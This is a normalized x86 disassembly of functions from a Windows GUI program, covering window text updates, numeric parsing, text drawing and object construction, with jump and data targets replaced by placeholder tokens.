mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] esi
mov eax [ ebx ]
mov edx [ eax + 0x14 ]
push ecx
mov ecx ebx
call edx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
mov edi 0x3
jmp r-xdata
sub_4310e0
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
push esi
mov esi ecx
xor ecx ecx
test al al
sete cl
movzx edx al
mov [ esi + 0x27 ] al
mov eax [ esi + 0x78 ]
push edx
add ecx 0x8
push eax
mov [ esi + 0xc0 ] ecx
call [ EnableWindow@IAT ]
cmp [ esi + 0x24 ] 0x0
je r-xdata
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x25 ] 0x0
je r-xdata
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ eax + 0xab ] 0x0
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push 0x0
push eax
push esi
call edx
sub_431150
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x3e9
mov eax ecx
jne r-xdata
xor eax eax
pop ebp
retn 0x10
mov ecx [ ebp + 0x14 ]
mov [ ecx ] 0x1
mov edx [ eax + 0xbc ]
push edx
call sub_431180
sub_431180
push ebp
mov ebp esp
and esp 0xffffffc0
sub esp 0x3c
cmp [ ebp + 0x8 ] 0x0
push esi
mov esi eax
je r-xdata
cmp [ esi + 0xc8 ] 0x0
je r-xdata
cmp [ esi + 0xc8 ] 0x0
je r-xdata
fld [ esi + 0xe0 ]
fsub [ esi + 0xf8 ]
fst [ esi + 0xe0 ]
fcomp [ esi + 0xe8 ]
fnstsw ax
test ah 0x5
jpe r-xdata
mov edx [ esi + 0xd8 ]
mov eax [ esi + 0xd0 ]
sub [ esi + 0xcc ] edx
cmp [ esi + 0xcc ] eax
jge r-xdata
fld [ esi + 0xf8 ]
fadd [ esi + 0xe0 ]
fst [ esi + 0xe0 ]
fcomp [ esi + 0xf0 ]
fnstsw ax
test ah 0x41
jne r-xdata
mov eax [ esi + 0xd8 ]
add [ esi + 0xcc ] eax
mov eax [ esi + 0xd4 ]
cmp [ esi + 0xcc ] eax
jle r-xdata
fld [ esi + 0xe0 ]
sub esp 0x8
fstp [ esp ]
call sub_431330
pop esi
mov esp ebp
pop ebp
retn 0x4
fld [ esi + 0xe8 ]
mov eax [ esi + 0xcc ]
push eax
call sub_431280
pop esi
mov esp ebp
pop ebp
retn 0x4
mov [ esi + 0xcc ] eax
fld [ esi + 0xf0 ]
jmp r-xdata
mov ecx [ esi + 0xcc ]
push ecx
call sub_431280
pop esi
mov esp ebp
pop ebp
retn 0x4
mov [ esi + 0xcc ] eax
fstp [ esi + 0xe0 ]
sub_431280
push ebp
mov ebp esp
push 0xffffffff
push sub_448fa8
mov eax [ fs : 0x0 ]
push eax
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi 0x1
mov [ esi + 0xcc ] eax
mov [ esi + 0xc8 ] edi
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
mov ecx [ esi + 0xcc ]
push ecx
push r--data
lea edi [ ebp + 0x8 ]
call sub_401dc0
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x78 ]
add esp 0x8
push edi
push edx
call [ SetWindowTextW@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ edi - 0x10 ]
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_431330
push ebp
mov ebp esp
push 0xffffffff
push sub_448f68
mov eax [ fs : 0x0 ]
push eax
push ecx
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
fld [ ebp + 0x8 ]
mov [ esi + 0xc8 ] 0x0
fstp [ esi + 0xe0 ]
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x1
fld [ esi + 0xe0 ]
sub esp 0x8
fstp [ esp ]
push r--data
lea edi [ ebp + 0xc ]
call sub_401dc0
mov edi [ ebp + 0xc ]
mov eax [ esi + 0x78 ]
add esp 0xc
push edi
push eax
call [ SetWindowTextW@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ edi - 0x10 ]
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_4313f0
push ebp
mov ebp esp
push 0xffffffff
push sub_449a30
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
lea ebx [ esi + 0x78 ]
lea edi [ ebp - 0x10 ]
call sub_419a00
mov eax [ ebp - 0x10 ]
mov ecx [ eax - 0xc ]
test ecx ecx
jns r-xdata
cmp [ eax ] 0x30
jne r-xdata
push 0x80070057
call sub_402d00
lea edi [ ebp - 0x10 ]
call sub_419a00
cmp [ esi + 0xc8 ] 0x0
mov edi [ ebp - 0x10 ]
je r-xdata
cmp ecx 0x1
jle r-xdata
fld [ r--data ]
fcom [ esi + 0xe8 ]
fnstsw ax
fld [ r--data ]
test ah 0x41
jne r-xdata
cmp [ esi + 0xd0 ] 0x0
jne r-xdata
cmp [ esi + 0xc8 ] 0x0
je r-xdata
fxch st1
fcomp [ esi + 0xf0 ]
fnstsw ax
test ah 0x41
jne r-xdata
fcom [ esi + 0xe8 ]
fnstsw ax
test ah 0x5
jpo r-xdata
push edi
call [ _wtol@IAT ]
mov ecx [ esi + 0xd0 ]
add esp 0x4
mov [ esi + 0xcc ] eax
cmp eax ecx
jl r-xdata
cmp [ esi + 0xd4 ] 0x0
je r-xdata
push eax
call [ _wtol@IAT ]
push eax
push r--data
lea edi [ ebp - 0x10 ]
mov [ esi + 0xcc ] eax
call sub_401dc0
mov esi [ ebp - 0x10 ]
mov eax [ ebx ]
add esp 0xc
push esi
push eax
call [ SetWindowTextW@IAT ]
mov ecx [ ebx ]
push 0x0
push 0x23
push 0x100
push ecx
call [ SendMessageW@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ esi - 0x10 ]
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jmp r-xdata
fstp st0
fcomp [ esi + 0xf0 ]
fnstsw ax
test ah 0x41
je r-xdata
fstp st1
fstp st0
push ecx
push r--data
lea edi [ ebp - 0x10 ]
mov [ esi + 0xcc ] ecx
call sub_401dc0
add esp 0x8
jmp r-xdata
mov ecx [ esi + 0xd4 ]
cmp eax ecx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
jg r-xdata
fcomp [ esi + 0xf0 ]
fnstsw ax
test ah 0x41
jne r-xdata
fstp st0
fld [ esi + 0xe8 ]
jmp r-xdata
jmp r-xdata
lea edi [ ebp - 0x10 ]
call sub_419a00
cmp [ esi + 0xc8 ] 0x0
mov edi [ ebp - 0x10 ]
push edi
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov edx [ ebx ]
push esi
push edx
call [ SetWindowTextW@IAT ]
mov eax [ ebx ]
push 0x0
push 0x23
push 0x100
push eax
call [ SendMessageW@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ esi - 0x10 ]
jmp r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
fld [ esi + 0xf0 ]
fstp [ esi + 0xe0 ]
sub esp 0x8
fld [ esi + 0xe0 ]
lea edi [ ebp - 0x10 ]
fstp [ esp ]
push r--data
call sub_401dc0
add esp 0xc
push edi
call [ _wtof@IAT ]
fst [ esi + 0xe0 ]
fcom [ esi + 0xe8 ]
add esp 0x4
fnstsw ax
test ah 0x5
jpe r-xdata
call [ _wtof@IAT ]
fst [ esi + 0xe0 ]
mov eax [ esi + 0x1c ]
mov ebx [ eax ]
add esp 0x4
call sub_4449b0
mov ecx [ esi + 0x1c ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ ebx + 0x10 ]
push 0x111
push esi
call eax
call [ _wtol@IAT ]
mov edx [ esi + 0x8 ]
mov ecx [ esi + 0x1c ]
add esp 0x4
push eax
push edx
mov [ esi + 0xcc ] eax
mov ebx [ ecx ]
mov edx [ ebx + 0x10 ]
push 0x111
push esi
call edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ edi - 0x10 ]
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
mov edx [ esi ]
mov eax [ edx + 0xa8 ]
mov ecx esi
call eax
sub_4316c0
push esi
mov esi ecx
cmp [ esi + 0x1c ] 0x0
je r-xdata
pop esi
retn
cmp [ esi + 0xc8 ] 0x0
je r-xdata
fld [ esi + 0xe0 ]
push ebx
push edi
mov edi [ esi + 0x1c ]
mov ebx [ edi ]
call sub_4449b0
mov ecx [ esi + 0x8 ]
mov edx [ ebx + 0x10 ]
push eax
push ecx
push 0x111
push esi
mov ecx edi
call edx
pop edi
pop ebx
mov edx [ esi + 0xcc ]
mov ecx [ esi + 0x1c ]
mov eax [ ecx ]
mov eax [ eax + 0x10 ]
push edx
mov edx [ esi + 0x8 ]
push edx
push 0x111
push esi
call eax
pop esi
retn
sub_431720
push esi
mov esi ecx
cmp [ esi + 0x1c ] 0x0
je r-xdata
pop esi
retn
cmp [ esi + 0xc8 ] 0x0
je r-xdata
fld [ esi + 0xe0 ]
fild [ esi + 0xcc ]
jmp r-xdata
push ebx
push edi
mov edi [ esi + 0x1c ]
mov ebx [ edi ]
call sub_4449b0
mov edx [ ebx + 0x10 ]
push eax
mov eax [ esi + 0x8 ]
push eax
push 0x500
push esi
mov ecx edi
call edx
pop edi
pop ebx
sub_431790
push ebp
mov ebp esp
push 0xffffffff
push sub_445cbb
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
call sub_40e3c0
mov [ ebp - 0x4 ] 0x0
mov [ eax + 0x70 ] r--data
mov cl 0x1
mov [ ebp - 0x4 ] cl
mov [ eax ] r--data
mov [ eax + 0x70 ] r--data
mov [ eax + 0x68 ] cl
mov [ ebp - 0x4 ] 0x2
mov [ eax ] r--data
mov [ eax + 0x70 ] r--data
mov [ eax + 0xc ] 0x1a
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_431810
push ebp
mov ebp esp
push 0xffffffff
push sub_4459bb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov eax 0x1
mov [ ebp - 0x4 ] eax
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] ecx
mov [ esi ] r--data
test [ ebp + 0x8 ] al
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_4318a0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44ac4d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x58
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x68 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi ecx
cmp [ edi + 0x24 ] 0x0
mov [ esp + 0x14 ] edi
je r-xdata
mov ecx [ esp + 0x68 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x50 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0xc
cmp [ edi + 0x25 ] 0x0
je r-xdata
cmp [ edi + 0x26 ] 0x0
je r-xdata
mov eax [ eax + 0x8 ]
mov esi [ eax ]
xor ebx ebx
mov [ esp + 0x70 ] ebx
mov ecx [ edi + 0x4 ]
lea edx [ esp + 0x18 ]
mov [ esp + 0x40 ] ebx
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] ebx
mov [ esp + 0x4c ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
mov ecx [ ecx + 0x98 ]
push edx
call sub_402a00
mov [ esp + 0x70 ] 0x1
mov eax [ edi + 0x4 ]
mov ecx [ eax + 0x9c ]
mov eax [ edi + 0x34 ]
mov edx [ edi + 0x30 ]
push 0xffffffff
mov [ esp + 0x58 ] eax
mov [ esp + 0x20 ] ecx
mov ecx [ edi + 0x38 ]
mov [ esp + 0x54 ] edx
mov edx [ edi + 0x3c ]
push 0xffffffff
lea eax [ esp + 0x58 ]
push eax
mov [ esp + 0x64 ] ecx
mov [ esp + 0x68 ] edx
call [ InflateRect@IAT ]
mov ecx [ esp + 0x18 ]
cmp [ ecx - 0xc ] ebx
je r-xdata
mov ecx [ esp + 0x54 ]
lea edx [ esp + 0x28 ]
push r--data
push edx
lea ecx [ esp + 0x20 ]
call sub_401c00
mov [ esp + 0x78 ] 0x2
push eax
lea eax [ esp + 0x38 ]
push eax
mov ebx r--data
call sub_401b20
add esp 0x10
mov [ esp + 0x70 ] 0x3
lea edi [ esp + 0x18 ]
call sub_401760
mov [ esp + 0x70 ] 0x2
mov eax [ esp + 0x2c ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ ecx + 0x80 ]
mov edi [ SetTextColor@IAT ]
push eax
push esi
call edi
push 0x1
push esi
mov ebx eax
call [ SetBkMode@IAT ]
push 0x25
lea edx [ esp + 0x44 ]
push edx
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x20 ]
push 0xffffffff
push eax
push esi
call [ DrawTextW@IAT ]
mov ecx [ esp + 0x1c ]
push ecx
push esi
call [ SetBkMode@IAT ]
push ebx
push esi
call edi
mov [ esp + 0x70 ] 0x1
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x4c ]
push eax
push 0x2
push 0x0
push 0x0
push esi
call [ ExtTextOutW@IAT ]
push ebx
push esi
call [ SetBkColor@IAT ]
mov [ esp + 0x70 ] 0x1
mov eax [ esp + 0x28 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ esp + 0x70 ] 0x0
mov eax [ esp + 0x18 ]
add eax 0xfffffff0
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
push eax
call [ DeleteObject@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ ecx - 0xc ]
mov edi ecx
cmp eax 0xffffffff
jne r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ esp + 0x70 ] 0xffffffff
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ esp + 0x14 ] 0x0
lea ecx [ esp + 0x20 ]
push ecx
push eax
push edi
push esi
call [ GetTextExtentPoint32W@IAT ]
mov eax [ esp + 0x1c ]
sub eax 0x0
je r-xdata
push ecx
call [ lstrlenW@IAT ]
mov ecx [ esp + 0x54 ]
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x50 ]
mov edi [ esp + 0x14 ]
add edx ecx
mov [ esp + 0x4c ] edx
mov edx [ esp + 0x20 ]
add eax 0xa
add edx eax
mov [ esp + 0x44 ] ecx
mov [ esp + 0x40 ] eax
mov [ esp + 0x48 ] edx
jmp r-xdata
dec eax
je r-xdata
mov eax [ esp + 0x50 ]
mov ebx [ esp + 0x5c ]
mov [ esp + 0x30 ] eax
mov eax [ esp + 0x24 ]
cdq
sub eax edx
mov edx [ esp + 0x58 ]
sar eax 0x1
add ecx eax
mov [ esp + 0x34 ] ecx
mov [ esp + 0x38 ] edx
sub ebx eax
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x70 ] 0x6
mov eax [ edi + 0x4 ]
mov ecx [ eax + 0x90 ]
mov eax [ eax + 0x94 ]
push ecx
push eax
push 0x0
call [ CreatePen@IAT ]
push eax
push esi
mov [ esp + 0x1c ] eax
call [ SelectObject@IAT ]
push 0x5
mov [ esp + 0x20 ] eax
call [ GetStockObject@IAT ]
push eax
push esi
call [ SelectObject@IAT ]
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x30 ]
push 0xa
push 0xa
push ebx
mov [ esp + 0x34 ] eax
mov eax [ esp + 0x44 ]
push eax
push ecx
push edx
push esi
call [ RoundRect@IAT ]
mov eax [ esp + 0x1c ]
mov ebx [ SelectObject@IAT ]
push eax
push esi
call ebx
mov ecx [ esp + 0x28 ]
push ecx
push esi
call ebx
mov edx [ edi + 0x4 ]
mov eax [ edx + 0x70 ]
push eax
push esi
call [ SetBkColor@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
mov edi [ esp + 0x20 ]
mov eax [ esp + 0x58 ]
mov ebx [ esp + 0x50 ]
mov ecx [ esp + 0x54 ]
sub eax edi
sub eax ebx
cdq
sub eax edx
mov edx [ esp + 0x24 ]
sar eax 0x1
add eax ebx
add edx ecx
add edi eax
mov [ esp + 0x48 ] edi
mov edi [ esp + 0x14 ]
mov [ esp + 0x44 ] ecx
mov [ esp + 0x40 ] eax
mov [ esp + 0x4c ] edx
jmp r-xdata
dec eax
mov edi [ esp + 0x14 ]
jne r-xdata
mov eax [ esp + 0x58 ]
mov ecx [ esp + 0x54 ]
mov edx [ esp + 0x24 ]
add eax 0xfffffff6
add edx ecx
mov [ esp + 0x48 ] eax
sub eax [ esp + 0x20 ]
mov [ esp + 0x44 ] ecx
mov [ esp + 0x4c ] edx
mov [ esp + 0x40 ] eax
jmp r-xdata
sub_431c70
push ebp
mov ebp esp
push 0xffffffff
push sub_44a216
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_42c0c0
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x154 ] r--data
mov [ esi + 0x1a4 ] r--data
mov [ esi + 0x1ac ] r--data
mov [ esi + 0x1d4 ] r--data
mov [ esi + 0x24c ] eax
mov [ esi + 0x250 ] eax
mov [ esi + 0x254 ] eax
mov [ esi + 0x258 ] eax
mov [ esi + 0x25c ] eax
mov [ esi + 0x260 ] eax
mov [ esi + 0x264 ] eax
mov [ esi + 0x268 ] eax
mov [ esi + 0x26c ] eax
mov [ esi + 0x270 ] eax
mov [ esi + 0x274 ] eax
mov [ ebp - 0x4 ] 0x1
mov ecx 0x1b
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] ecx
or ecx 0xffffffff
mov [ esi + 0x220 ] r--data
mov [ esi + 0x27c ] eax
mov [ esi + 0x280 ] ecx
mov [ esi + 0x248 ] eax
mov [ esi + 0x284 ] eax
mov [ esi + 0x235 ] al
mov [ ebp - 0x4 ] ecx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_431d70
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_431da0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_431da0
push ebp
mov ebp esp
push 0xffffffff
push sub_44a1de
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x154 ] r--data
mov [ esi + 0x1a4 ] r--data
mov [ esi + 0x1ac ] r--data
mov [ esi + 0x1d4 ] r--data
xor edi edi
mov [ ebp - 0x4 ] edi
mov eax [ esi + 0x26c ]
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ esi + 0x26c ] edi
mov [ esi + 0x270 ] edi
mov [ esi + 0x274 ] edi
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x154 ] r--data
mov [ esi + 0x1a4 ] r--data
mov [ esi + 0x1ac ] r--data
mov [ esi + 0x1d4 ] r--data
mov [ ebp - 0x4 ] eax
mov ecx esi
call sub_418cc0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push eax
call [ operator delete@IAT ]
add esp 0x4
sub_431e80
push ebp
mov ebp esp
push 0xffffffff
push sub_44a58f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x44
call [ operator new@IAT ]
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp esi ebx
je r-xdata
xor esi esi
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x4 ]
mov ecx rw-data
mov [ ebp - 0x14 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x2
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x34 ] ebx
mov [ esi + 0x38 ] ebx
mov [ esi + 0x3c ] ebx
mov [ esi + 0x40 ] ebx
mov [ ebp - 0x4 ] bl
jmp r-xdata
push edx
push edi
call sub_402910
mov eax [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
xor ebx ebx
mov [ esi + 0x20 ] edx
mov [ esi + 0x24 ] eax
cmp eax ebx
je r-xdata
mov eax edx
lea ecx [ eax + 0x2 ]
mov [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ ebp + 0xc ]
mov [ ebp - 0x10 ] esi
mov [ esi ] 0xffffffff
lea edi [ esi + 0x4 ]
cmp edx ebx
je r-xdata
mov edi [ ebp + 0x8 ]
mov [ esi + 0x18 ] ebx
mov [ esi + 0x30 ] 0xffffffff
mov [ esi + 0x28 ] ebx
mov [ esi + 0x2c ] ebx
lea esi [ edi + 0x26c ]
lea ecx [ ebp - 0x10 ]
call sub_428170
mov ecx [ esi + 0x4 ]
sub ecx [ esi ]
mov eax [ ebp - 0x10 ]
sar ecx 0x2
dec ecx
mov [ eax + 0x1c ] ecx
cmp [ edi + 0x25 ] bl
jne r-xdata
inc [ eax + 0x4 ]
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax [ ebp + 0xc ]
sar eax 0x1
mov ebx eax
mov edi [ edi + 0x280 ]
cmp edi 0xffffffff
jne r-xdata
mov edx [ edi + 0x248 ]
mov edx [ edx + 0x128 ]
cmp edx ebx
je r-xdata
cmp ecx edi
je r-xdata
cmp [ ebp + 0x18 ] bl
je r-xdata
cmp [ ebp + 0x10 ] edx
jne r-xdata
or [ eax + 0x18 ] 0x1
mov eax [ eax + 0x1c ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov eax ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
or [ eax + 0x18 ] 0x1
mov eax [ eax + 0x1c ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_432000
push ebp
mov ebp esp
push 0xffffffff
push sub_445983
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ edi + 0x270 ]
sub eax [ edi + 0x26c ]
xor ebx ebx
sar eax 0x2
test eax eax
je r-xdata
mov ecx [ edi + 0x270 ]
mov esi [ edi + 0x26c ]
cmp esi ecx
je r-xdata
mov ecx [ edi + 0x26c ]
mov esi [ ecx + ebx * 4 ]
test esi esi
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ecx
sub eax ecx
sar eax 0x2
lea ebx [ eax * 4 ]
push ebx
push ecx
push esi
call [ memmove@IAT ]
add esp 0xc
add ebx esi
mov [ edi + 0x270 ] ebx
mov ecx [ edi + 0x270 ]
sub ecx [ edi + 0x26c ]
inc ebx
sar ecx 0x2
cmp ebx ecx
jb r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
cmp [ esi + 0x28 ] 0x0
je r-xdata
mov ecx [ esi + 0x24 ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x10 ] esi
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] ecx
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ esi + 0x28 ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
push esi
call [ operator delete@IAT ]
add esp 0x4
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_432100
push ebp
mov ebp esp
push 0xffffffff
push sub_445953
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x4 ]
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] ecx
mov eax [ eax ]
sub eax 0x10
lea edx [ eax + 0xc ]
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
push esi
call [ operator delete@IAT ]
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_432170
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x69 ] 0x0
push edi
mov edi [ ebp + 0x8 ]
je r-xdata
mov eax [ ebp + 0xc ]
push eax
push edi
call sub_40e4c0
cmp [ esi + 0x158 ] 0x0
mov eax [ esi + 0x4 ]
mov [ esi + 0x244 ] edi
mov ecx [ eax + 0x70 ]
mov [ esi + 0x194 ] ecx
mov edx [ eax + 0x80 ]
mov [ esi + 0x198 ] edx
je r-xdata
mov [ edi + 0x40 ] 0x1
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0x248 ] edi
jne r-xdata
movzx eax [ edi + 0xf6 ]
mov [ esi + 0x158 ] eax
pop edi
pop esi
pop ebp
retn 0x8
mov ecx [ edi + 0x124 ]
mov [ esi + 0x280 ] ecx
cmp [ edi + 0x124 ] 0x0
je r-xdata
dec [ esi + 0x280 ]
sub_432200
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub esp 0x10
push ebx
push esi
mov esi ecx
